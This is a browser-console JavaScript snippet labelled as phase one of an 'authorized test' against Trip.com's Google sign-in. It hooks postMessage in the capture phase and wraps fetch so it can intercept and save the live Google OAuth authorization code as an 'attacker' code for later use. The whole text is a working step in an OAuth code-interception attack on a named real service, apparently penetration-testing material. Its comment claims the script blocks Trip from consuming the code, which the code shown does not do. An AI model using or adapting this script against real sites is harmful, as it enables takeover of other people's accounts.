// ===== PHASE 1: ATTACKER profile — CAPTURE the live Google authCode =====
// Paste into console of https://www.trip.com/account/signin in the ATTACKER browser profile,
// THEN click "Continue with Google" and complete Google consent with YOUR OWN google account.
// It intercepts the code from the postMessage and shows it, and tries to hold it (blocks Trip from consuming).
// Authorized test, sshabib.

(function () {
  console.log('%c[CAPTURE] armed. Now click "Continue with Google" and finish consent.', 'color:#fa0;font-weight:bold');

  // grab the code out of the inbound postMessage before the SDK exchanges it
  window.addEventListener('message', function (e) {
    try {
      const d = e.data;
      if (d && (d.code || (typeof d === 'string' && d.includes('code')))) {
        console.log('%c[CAPTURE] inbound message with a code — origin=' + e.origin, 'color:#0af;font-weight:bold');
        console.log('   full data:', d);
        if (d.code) {
          window.__ATTACKER_CODE = d.code;
          window.__ATTACKER_TYPE = d.type || d.thirdType || 'google';
          console.log('%c[CAPTURE] SAVED window.__ATTACKER_CODE = ' + d.code, 'color:#0f0;font-size:15px;font-weight:bold');
          console.log('%c[CAPTURE] type = ' + window.__ATTACKER_TYPE + '  — copy the code string NOW (it expires ~fast).', 'color:#0f0');
        }
      }
    } catch (err) {}
  }, true); // capture phase, run before the SDK's own listener

  // also watch the network in case the code rides a redirect/param
  const of = window.fetch;
  window.fetch = function (u) {
    const s = String((typeof u === 'string') ? u : (u && u.url) || '');
    if (s.includes('authenticateTrip') || s.includes('thirdPartyLogin') || s.includes('code=')) {
      console.log('%c[CAPTURE] auth-related fetch: ' + s, 'color:#0af');
    }
    return of.apply(this, arguments);
  };
})();
